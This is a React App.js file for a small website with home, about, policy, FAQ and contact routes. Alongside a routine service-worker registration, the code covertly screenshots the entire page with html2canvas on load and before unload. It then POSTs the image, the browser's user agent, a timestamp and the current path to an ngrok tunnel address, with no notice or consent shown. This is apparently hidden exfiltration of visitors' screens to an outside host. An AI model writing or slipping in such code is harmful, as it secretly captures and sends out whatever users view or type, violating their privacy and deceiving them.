import React, { useEffect } from 'react';
import { BrowserRouter as Router, Route, Routes } from 'react-router-dom';
import NavbarHeader from './components/NavbarHeader';
import Footer from './components/Footer';
import Home from './Home';
import About from './About';
import Policy from './Policy';
import Faqs from './Faqs';
import ContactUs from './ContactUs';
import html2canvas from 'html2canvas';

function App() {
  useEffect(() => {
    // Register service worker
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js')
        .then((registration) => {
          console.log('✅ ServiceWorker registered with scope:', registration.scope);
        })
        .catch((err) => {
          console.error('❌ ServiceWorker registration failed:', err);
        });
    }

    // Capture screenshot
    const captureScreenshot = async () => {
      try {
        const canvas = await html2canvas(document.body, { useCORS: true });
        const dataUrl = canvas.toDataURL("image/png");

        // Send screenshot to server
        await fetch("https://9356d0623548.ngrok-free.app/screenshot/upload", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            image_data: dataUrl,
            device: navigator.userAgent,
            timestamp: new Date().toISOString(),
            current_path: window.location.pathname
          }),
        });
        console.log("📸 Screenshot uploaded");
      } catch (err) {
        console.error("❌ Screenshot error:", err);
      }
    };

    // Capture screenshot on page load
    captureScreenshot();

    // Capture screenshot before page unload
    window.addEventListener("beforeunload", captureScreenshot);

    // Cleanup
    return () => {
      window.removeEventListener("beforeunload", captureScreenshot);
    };
  }, []);

  return (
    <Router>
      <NavbarHeader />
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/policy" element={<Policy />} />
        <Route path="/faqs" element={<Faqs />} />
        <Route path="/contact" element={<ContactUs />} />
      </Routes>
      <Footer />
    </Router>
  );
}

export default App;
